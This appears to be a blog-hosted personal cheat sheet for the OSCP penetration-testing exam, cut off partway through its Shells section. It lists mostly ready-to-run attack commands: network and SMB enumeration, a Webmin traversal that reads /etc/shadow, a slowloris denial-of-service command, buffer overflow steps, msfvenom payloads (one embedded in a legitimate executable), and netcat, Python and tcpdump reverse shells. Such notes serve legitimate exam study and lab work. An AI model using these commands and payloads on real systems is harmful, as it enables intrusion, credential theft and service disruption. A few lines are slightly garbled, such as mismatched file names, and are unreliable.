---
layout: ../../../layouts/BlogPost.astro
title: "【Pentest】OSCP Survival Guide"
uuid: c0e91ba2-4897-11ed-af17-f296579e3926
version: 4
created: Sun, 13 Jun 2021 14:35:01 +0000
tags:
- imported/evernote
---

# OSCP-Survival-Guide

**NOTE: This document refers to the target ip as the export variable $ip.** **To set this value on the command line use the following syntax:** **export ip=192.168.1.100**

## Table of Contents

- [Kali Linux](about:blank%23kali-linux) 

- [Information Gathering & Vulnerability Scanning](about:blank%23information-gathering--vulnerability-scanning) 

    - [Passive Information Gathering](about:blank%23passive-information-gathering) 

    - [Active Information Gathering](about:blank%23active-information-gathering) 

    - [Port Scanning](about:blank%23port-scanning) 

    - [Enumeration](about:blank%23enumeration) 

    - [HTTP Enumeration](about:blank%23http-enumeration) 

- [Buffer Overflows and Exploits](about:blank%23buffer-overflows-and-exploits) 

- [Shells](about:blank%23shells) 

- [File Transfers](about:blank%23file-transfers) 

- [Privilege Escalation](about:blank%23privilege-escalation) 

    - [Linux Privilege Escalation](about:blank%23linux-privilege-escalation) 

    - [Windows Privilege Escalation](about:blank%23windows-privilege-escalation) 

- [Client, Web and Password Attacks](about:blank%23client-web-and-password-attacks) 

    - [Client Attacks](about:blank%23client-attacks) 

    - [Web Attacks](about:blank%23web-attacks) 

    - [File Inclusion Vulnerabilities LFI/RFI](about:blank%23file-inclusion-vulnerabilities) 

    - [Database Vulnerabilities](about:blank%23database-vulnerabilities) 

    - [Password Attacks](about:blank%23password-attacks) 

    - [Password Hash Attacks](about:blank%23password-hash-attacks) 

- [Networking, Pivoting and Tunneling](about:blank%23networking-pivoting-and-tunneling) 

- [The Metasploit Framework](about:blank%23the-metasploit-framework) 

- [Bypassing Antivirus Software](about:blank%23bypassing-antivirus-software) 

# Kali Linux

- Set the Target IP Address to the $ip system variableexport ip=192.168.1.100

- Find the location of a filelocate sbd.exe

- Search through directories in the $PATH environment variablewhich sbd

- Find a search for a file that contains a specific string in it’s name:find / -name sbd\\\*

- Show active internet connectionsnetstat -lntp

- Change Passwordpasswd

- Verify a service is running and listeningnetstat -antp |grep apache

- Start a servicesystemctl start ssh\
systemctl start apache2

- Have a service start at bootsystemctl enable ssh

- Stop a servicesystemctl stop ssh

- Unzip a gz filegunzip access.log.gz

- Unzip a tar.gz filetar -xzvf file.tar.gz

- Search command historyhistory | grep phrase_to_search_for

- Download a webpagewget <[http://www.cisco.com](http://www.cisco.com/)>

- Open a webpagecurl <[http://www.cisco.com](http://www.cisco.com/)>

- String manipulation

    - Count number of lines in filewc -l index.html

    - Get the start or end of a filehead index.html\
tail index.html

    - Extract all the lines that contain a stringgrep "href=" index.html

    - Cut a string by a delimiter, filter results then sortgrep "href=" index.html | cut -d "/" -f 3 | grep "\\\\." | cut -d '"' -f 1 | sort -u

    - Using Grep and regular expressions and output to a filecat index.html | grep -o 'http://\\\[^"\\\]\\\*' | cut -d "/" -f 3 | sort –u > list.txt

    - Use a bash loop to find the IP address behind each hostfor url in $(cat list.txt); do host $url; done

    - Collect all the IP Addresses from a log file and sort by frequencycat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

- Decoding using Kali

    - Decode Base64 Encoded Values\
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode

    - Decode Hexidecimal Encoded Valuesecho -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps

- Netcat - Read and write TCP and UDP Packets

    - Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):[https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/) 

    - Connect to a POP3 mail servernc -nv $ip 110

    - Listen on TCP/UDP portnc -nlvp 4444

    - Connect to a netcat portnc -nv $ip 4444

    - Send a file using netcatnc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe

    - Receive a file using netcatnc -nlvp 4444 > incoming.exe

    - Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that…\
whereis nc\
nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

/bin/nc.traditional -e /bin/bash 1.2.3.4 4444

- Create a reverse shell with Ncat using cmd.exe on Windowsnc.exe -nlvp 4444 -e cmd.exe\
or\
nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe

- Create a reverse shell with Ncat using bash on Linuxnc -nv $ip 4444 -e /bin/bash

- Netcat for Banner Grabbing:\
echo "" | nc -nv -w1 <IP Address> <Ports>

- Ncat - Netcat for Nmap project which provides more security avoid IDS

    - Reverse shell from windows using cmd.exe using sslncat --exec cmd.exe --allow $ip -vnl 4444 --ssl

    - Listen on port 4444 using sslncat -v $ip 4444 --ssl

- Wireshark

    - Show only SMTP (port 25) and ICMP traffic:\
tcp.port eq 25 or icmp

    - Show only traffic in the LAN (192.168.x.x), between workstations and servers – no Internet:\
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16

    - Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:\
ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip

    - Some commands are equal\
ip.addr == xxx.xxx.xxx.xxx\
Equals\
ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx\
ip.addr != xxx.xxx.xxx.xxx\
Equals\
ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx

- Tcpdump

    - Display a pcap filetcpdump -r passwordz.pcap

    - Display ips and filter and sorttcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head

    - Grab a packet capture on port 80tcpdump tcp port 80 -w output.pcap -i eth0

    - Check for ACK or PSH flag set in a TCP packettcpdump -A -n 'tcp\[13\] = 24' -r passwordz.pcap

- Dsniff

    - Display a pcap file with telnet protocoldsniff -p ch2.pcap

- IPTables

    - Deny traffic to ports except for Local Loopback\
iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP\
iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP

    - Clear ALL IPTables firewall rules\
\`\`\`bash\
iptables -P INPUT ACCEPT\
iptables -P FORWARD ACCEPT\
iptables -P OUTPUT ACCEPT\
iptables -t nat -F\
iptables -t mangle -F\
iptables -F\
iptables -X\
iptables -t raw -F iptables -t raw -X

# Information Gathering & Vulnerability Scanning

- Google Hacking

    - Google search to find website sub domainssite:[microsoft.com](http://microsoft.com/) 

    - Google filetype, and intitleintitle:"netbotz appliance" "OK" -filetype:pdf

    - Google inurlinurl:"level/15/sexec/-/show"

    - Google Hacking Database:[https://www.exploit-db.com/google-hacking-database/](https://www.exploit-db.com/google-hacking-database/) 

- SSL Certificate Testing[https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html) 

- Email Harvesting

    - Simply Emailgit clone <[https://github.com/killswitch-GUI/SimplyEmail.git](https://github.com/killswitch-GUI/SimplyEmail.git)>\
./SimplyEmail.py -all -e TARGET-DOMAIN

- LDAP

    - LDAP null bindldapsearch -x -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" -H "[ldap://challenge01.root-me.org:54013](ldap://challenge01.root-me.org:54013/)"

- Netcraft

    - Determine the operating system and tools used to build a site[https://searchdns.netcraft.com/](https://searchdns.netcraft.com/) 

- Whois Enumerationwhois [domain-name-here.com](http://domain-name-here.com/)\
whois $ip

- Banner Grabbing

    - nc -v $ip 25

    - telnet $ip 25

    - nc TARGET-IP 80

- Recon-ng - full-featured web reconnaissance framework written in Python

    - cd /opt; git clone <https://[LaNMaSteR53@bitbucket.org](mailto:LaNMaSteR53@bitbucket.org)/LaNMaSteR53/recon-ng.git>\
cd /opt/recon-ng\
./recon-ng\
show modules\
help\
*Subnet Reference Table*\
[Untitled](https://www.notion.so/8dcaff5d6e6544d489909ff04106f700) 

- Set the ip address as a variableexport ip=192.168.1.100 nmap -A -T4 -p- $ip

- Netcat port Scanningnc -nvv -w 1 -z $ip 3388-3390

- Discover active IPs usign ARP on the network: arp-scan $ip/24

- Discover who else is on the networknetdiscover

- Discover IP Mac and Mac vendors from ARPnetdiscover -r $ip/24

- Nmap stealth scan using SYNnmap -sS $ip

- Nmap stealth scan using FINnmap -sF $ip

- Nmap Banner Grabbingnmap -sV -sT $ip

- Nmap OS Fingerprintingnmap -O $ip

- Nmap Regular Scan:nmap $ip/24

- Enumeration Scannmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt

- Enumeration Scan All Ports TCP / UDP and output to a txt filenmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip

- Nmap output to a file:nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24

- Quick Scan:nmap -T4 -F $ip/24

- Quick Scan Plus:nmap -sV -T4 -O -F --version-light $ip/24

- Quick traceroutenmap -sn --traceroute $ip

- All TCP and UDP Portsnmap -v -sU -sS -p- -A -T4 $ip

- Intense Scan:nmap -T4 -A -v $ip

- Intense Scan Plus UDPnmap -sS -sU -T4 -A -v $ip/24

- Intense Scan ALL TCP Portsnmap -p 1-65535 -T4 -A -v $ip/24

- Intense Scan - No Pingnmap -T4 -A -v -Pn $ip/24

- Ping scannmap -sn $ip/24

- Slow Comprehensive Scannmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24

- Scan with Active connect in order to weed out any spoofed ports designed to troll younmap -p1-65535 -A -T5 -sT $ip

- DNS Enumeration

    - NMAP DNS Hostnames Lookup nmap -F --dns-server <dns server ip> <target ip range>

    - Host Lookuphost -t ns [megacorpone.com](http://megacorpone.com/) 

    - Reverse Lookup Brute Force - find domains in the same rangefor ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"

    - Perform DNS IP Lookupdig a [domain-name-here.com](http://domain-name-here.com/) @nameserver

    - Perform MX Record Lookupdig mx [domain-name-here.com](http://domain-name-here.com/) @nameserver

    - Perform Zone Transfer with DIGdig axfr [domain-name-here.com](http://domain-name-here.com/) @nameserver

    - DNS Zone Transfers Windows DNS zone transfer\
nslookup -> set type=any -> ls -d [blah.com](http://blah.com/)\
Linux DNS zone transfer\
dig axfr [blah.com](http://blah.com/) @[ns1.blah.com](http://ns1.blah.com/) 

    - Dnsrecon DNS Brute Forcednsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

    - Dnsrecon DNS List of megacorpdnsrecon -d [megacorpone.com](http://megacorpone.com/) -t axfr

    - DNSEnumdnsenum zonetransfer.me

- NMap Enumeration Script List:

    - NMap Discovery\*[https://nmap.org/nsedoc/categories/discovery.html](https://nmap.org/nsedoc/categories/discovery.html)\*

    - Nmap port version detection MAXIMUM powernmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>

- NFS (Network File System) Enumeration

    - Show Mountable NFS Shares nmap -sV --script=nfs-showmount $ip

- RPC (Remote Procedure Call) Enumeration

    - Connect to an RPC share without a username and password and enumerate privledges rpcclient --user="" --command=enumprivs -N $ip

    - Connect to an RPC share with a username and enumerate privledges rpcclient --user="<Username>" --command=enumprivs $ip

- SMB Enumeration

    - SMB OS Discoverynmap $ip --script smb-os-discovery.nse

    - Nmap port scannmap -v -p 139,445 -oG smb.txt $ip-254

    - Netbios Information Scanningnbtscan -r $ip/24

    - Nmap find exposed Netbios serversnmap -sU --script nbstat.nse -p 137 $ip

    - Nmap all SMB scripts scan\
nmap -sV -Pn -vv -p 445 --script='(smb\*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip

    - Nmap all SMB scripts authenticated scan\
nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb\*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip

    - SMB Enumeration Toolsnmblookup -A $ip\
smbclient //MOUNT/share -I $ip -N\
rpcclient -U "" $ip\
enum4linux $ip\
enum4linux -a $ip

    - SMB Finger Printingsmbclient -L //$ip

    - Nmap Scan for Open SMB Sharesnmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24

    - Nmap scans for vulnerable SMB Serversnmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip

    - Nmap List all SMB scripts installedls -l /usr/share/nmap/scripts/smb\*

    - Enumerate SMB Users\
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14\
OR\
python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip

    - RID Cycling - Null Sessionsridenum.py $ip 500 50000 dict.txt

    - Manual Null Session Testing\
Windows: net use \\\\$ip\\IPC$ "" /u:""\
Linux: smbclient -L //$ip

- SMTP Enumeration - Mail Severs

    - Verify SMTP port using Netcatnc -nv $ip 25

- POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet\
root@kali:\~# telnet $ip 110\
\+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready\
USER billydean\
\+OK\
PASS password\
\+OK Welcome billydean

list

\+OK 2 1807\
1 786\
2 1021

retr 1

\+OK Message follows\
From: [jamesbrown@motown.com](mailto:jamesbrown@motown.com)\
Dear Billy Dean,

Here is your login for remote desktop ... try not to forget it this time!\
username: billydean\
password: PA$$W0RD!Z

- SNMP Enumeration -Simple Network Management Protocol

    - Fix SNMP output values so they are human readableapt-get install snmp-mibs-downloader download-mibs echo "" > /etc/snmp/snmp.conf

    - SNMP Enumeration Commands

        - snmpcheck -t $ip -c public

        - snmpwalk -c public -v1 $ip 1|

        - grep hrSWRunName|cut -d\\\* \\\* -f

        - snmpenum -t $ip

        - onesixtyone -c names -i hosts

    - SNMPv3 Enumerationnmap -sV -p 161 --script=snmp-info $ip/24

    - Automate the username enumeration process for SNMPv3:apt-get install snmp snmp-mibs-downloader wget <[https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb](https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb)>

    - SNMP Default Credentials /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

- MS SQL Server Enumeration

    - Nmap Information Gathering\
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip

- Webmin and miniserv/0.01 Enumeration - Port 10000\
Test for LFI & file disclosure vulnerability by grabbing /etc/passwd\
`curl \\<http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`>\
Test to see if webmin is running as root by grabbing /etc/shadow\
`curl \\<http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`>

- Linux OS Enumeration

    - List all SUID filesfind / -perm -4000 2>/dev/null

    - Determine the current version of Linuxcat /etc/issue

    - Determine more information about the environmentuname -a

    - List processes runningps -xaf

    - List the allowed (and forbidden) commands for the invoking usesudo -l

    - List iptables rulesiptables --table nat --list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security

- Windows OS Enumeration

    - net config Workstation

    - systeminfo | findstr /B /C:“OS Name” /C:“OS Version”

    - hostname

    - net users

    - ipconfig /all

    - route print

    - arp -A

    - netstat -ano

    - netsh firewall show state

    - netsh firewall show config

    - schtasks /query /fo LIST /v

    - tasklist /SVC

    - net start

    - DRIVERQUERY

    - reg query HKLM

    - reg query HKCU

    - dir /s *pass* == *cred* == *vnc* == *.config*

    - findstr /si password *.xml* .ini \*.txt

    - reg query HKLM /f password /t REG_SZ /s

    - reg query HKCU /f password /t REG_SZ /s

- Vulnerability Scanning with Nmap

- Nmap Exploit Scripts\*[https://nmap.org/nsedoc/categories/exploit.html](https://nmap.org/nsedoc/categories/exploit.html)\*

- Nmap search through vulnerability scriptscd /usr/share/nmap/scripts/ ls -l \\*vuln\\*

- Nmap search through Nmap Scripts for a specific keywordls /usr/share/nmap/scripts/\\\* | grep ftp

- Scan for vulnerable exploits with nmapnmap --script exploit -Pn $ip

- NMap Auth Scripts\*[https://nmap.org/nsedoc/categories/auth.html](https://nmap.org/nsedoc/categories/auth.html)\*

- Nmap Vuln Scanning\*[https://nmap.org/nsedoc/categories/vuln.html](https://nmap.org/nsedoc/categories/vuln.html)\*

- NMap DOS Scanningnmap --script dos -Pn $ip NMap Execute DOS Attack nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true

- Scan for coldfusion web vulnerabilitiesnmap -v -p 80 --script=http-vuln-cve2010-2861 $ip

- Anonymous FTP dump with Nmapnmap -v -p 21 --script=ftp-anon.nse $ip-254

- SMB Security mode scan with Nmapnmap -v -p 21 --script=ftp-anon.nse $ip-254

- File Enumeration

    - Find UID 0 files root execution

    - /usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\\\; 2>/dev/null

    - Get handy linux file system enumeration script (/var/tmp)wget <[https://highon.coffee/downloads/linux-local-enum.sh](https://highon.coffee/downloads/linux-local-enum.sh)> chmod +x ./linux-local-enum.sh ./linux-local-enum.sh

    - Find executable files updated in Augustfind / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug

    - Find a specific file on linuxfind /. -name suid\\\*

    - Find all the strings in a filestrings <filename>

    - Determine the type of a filefile <filename>

- HTTP Enumeration

    - Search for folders with gobuster:gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip

    - OWasp DirBuster - Http folder enumeration - can take a dictionary file

    - Dirb - Directory brute force finding using a dictionary filedirb <http://$ip/> wordlist.dict dirb <[http://vm/](http://vm/)>\
Dirb against a proxy

    - dirb [<http://$ip/>](\\<\[http://172.16.0.19/\](http://172.16.0.19/)\\>) -p $ip:3129

    - Niktonikto -h $ip

    - HTTP Enumeration with NMAPnmap --script=http-enum -p80 -n $ip/24

    - Nmap Check the server methodsnmap --script http-methods --script-args http-methods.url-path='/test' $ip

    - Get Options available from web server curl -vX OPTIONS vm/test

    - Uniscan directory finder:uniscan -qweds -u <[http://vm/](http://vm/)>

    - Wfuzz - The web brute forcer\
wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test\
wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ\
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"\
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ\
Recurse level 3\
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ

- Open a service using a port knock (Secured with Knockd) for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x server_ip_address; done

- WordPress Scan - Wordpress security scanner

    - wpscan –url $ip/blog –proxy $ip:3129

- RSH Enumeration - Unencrypted file transfer system

    - auxiliary/scanner/rservices/rsh_login

- Finger Enumeration

    - finger @$ip

    - finger batman@$ip

- TLS & SSL Testing

    - ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html

- Proxy Enumeration (useful for open proxies)

    - nikto -useproxy [http://:3128$ip](http://:3128$ip/) -h $ip

- Steganography

> apt-get install steghidesteghide extract -sf picture.jpgsteghide info picture.jpgapt-get install stegosuite

- The OpenVAS Vulnerability Scanner

    - apt-get update apt-get install openvas openvas-setup

    - netstat -tulpn

    - Login at: [https://:9392$ip](https://:9392$ip/) 

# Buffer Overflows and Exploits

- DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)

- Nmap Fuzzers:

    - NMap Fuzzer List[https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html) 

    - NMap HTTP Form Fuzzer nmap –script http-form-fuzzer –script-args ‘http-form-fuzzer.targets={1={path=/},2={path=/register.html}}’ -p 80 $ip

    - Nmap DNS Fuzzer nmap –script dns-fuzz –script-args timelimit=2h $ip -d

- MSFvenom\*[https://www.offensive-security.com/metasploit-unleashed/msfvenom/](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\*

- Windows Buffer Overflows

    - Controlling EIP\
locate pattern_create\
pattern_create.rb -l 2700\
locate pattern_offset\
pattern_offset.rb -q 39694438

    - Verify exact location of EIP - \[\*\] Exact match at offset 2606\
buffer = "A" \\\* 2606 + "B" \\\* 4 + "C" \\\* 90

    - Check for “Bad Characters” - Run multiple times 0x00 - 0xFF

    - Use Mona to determine a module that is unprotected

    - Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP

    - Use NASM to determine the HEX code for a JMP ESP instruction\
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

JMP ESP\
00000000 FFE4 jmp esp

- Run Mona in immunity log window to find (FFE4) XEF command\
!mona find -s "\\xff\\xe4" -m slmfc.dll\
found at 0x5f4a358f - Flip around for little endian format\
buffer = "A" \* 2606 + "\\x8f\\x35\\x4a\\x5f" + "C" \* 390

- MSFVenom to create payload\
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d"

- Final Payload with NOP slide\
buffer="A"\*2606 + "\\x8f\\x35\\x4a\\x5f" + "\\x90" \* 8 + shellcode

- Create a PE Reverse Shell msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe

- Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

- Create a PE reverse shell and embed it into an existing executable msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

- Create a PE Reverse HTTPS shell msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe

- Linux Buffer Overflows

    - Run Evans Debugger against an app edb –run /usr/games/crossfire/bin/crossfire

    - ESP register points toward the end of our CBuffer add eax,12 jmp eax 83C00C add eax,byte +0xc FFE0 jmp eax

    - Check for “Bad Characters” Process of elimination - Run multiple times 0x00 - 0xFF

    - Find JMP ESP address “97451308” # Found at Address 08134597

    - crash = “41” \* 4368 + “97451308” + “8300c09090”

    - msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b “000a0d20” –e x86/shikata_ga_nai

    - Connect to the shell with netcat: nc -v $ip 4444

# Shells

- Netcat Shell Listener\
nc -nlvp 4444

- Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user.\
(For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )

(hint: sudo -l to see what you can run)

- You may encounter limited shells that use rbash and only allow you to execute a single command per session. You can overcome this by executing an SSH shell to your localhost:\
ssh user@$ip nc $localip 4444 -e /bin/sh\
enter user's password\
python -c 'import pty; pty.spawn("/bin/sh")'\
export TERM=linux\
python -c 'import pty; pty.spawn("/bin/sh")'

- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\\\["/bin/sh","-i"\\\]);'\
echo os.system('/bin/bash')\
/bin/sh -i\
perl —e 'exec "/bin/sh";'\
perl: exec "/bin/sh";\
ruby: exec "/bin/sh"\
lua: os.execute('/bin/sh')\
From within IRB: exec "/bin/sh"\
From within vi: :!bash or\
\:set shell=/bin/bash:shell\
From within vim ':!bash':\
From within nmap: !sh\
From within tcpdump

- echo $’id\\\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root\
From busybox /bin/busybox telnetd -|/bin/sh -p9999

- Pen test monkey PHP reverse shell[http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shel) 

- php-findsock-shell - turns PHP port 80 into an interactive shell[http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell) 

- Perl Reverse Shell[http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) 

- PHP powered web browser Shell b374k with file upload etc.[https://github.com/b374k/b374k](https://github.com/b374k/b374k) 

- Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell[https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1) 

- Web Backdoors from Fuzzdb [https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors](https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors) 

- Creating Meterpreter Shells with MSFVenom - [http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/](http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/)\
*Linux*\
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf\
*Windows*\
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe\
*Mac*\
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho\
**Web Payloads**\
*PHP*\
msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php\
OR\
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php\
Then we need to add the shell.php && pbpaste >> shell.php\`\
*ASP*\
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp\
*JSP*\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp\
*WAR*\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war\
**Scripting Payloads**\
*Python*\
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py\
*Bash*\
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh\
*Perl*\
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl\
**Shellcode**\
For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.\
*Linux Based Shellcode*\
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\
*Windows Based Shellcode*\
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\
*Mac Based Shellcode*\
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\
**Handlers** Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.\
use exploit/multi/handler\
set PAYLOAD <Payload name>\
set LHOST <LHOST value>\
set LPORT <LPORT value>\
set ExitOnSession false\
exploit -j -z\
Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

- SSH to Meterpreter: [https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/](https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/)\
use auxiliary/scanner/ssh/ssh_login\
use post/multi/manage/shell_to_meterpreter

- SBD.exe\
sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe (part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a windows box as a Netcat alternative.

- Shellshock

    - Testing for shell shock with NMap\
root@kali:\~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip

    - git clone [https://github.com/nccgroup/shocker](https://github.com/nccgroup/shocker)\
./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

    - Shell Shock SSH Forced Command Check for forced command by enabling all debug output with ssh\
ssh -vvv\
ssh -i noob noob@$ip '() { :;}; /bin/bash'

    - cat file (view file contents)\
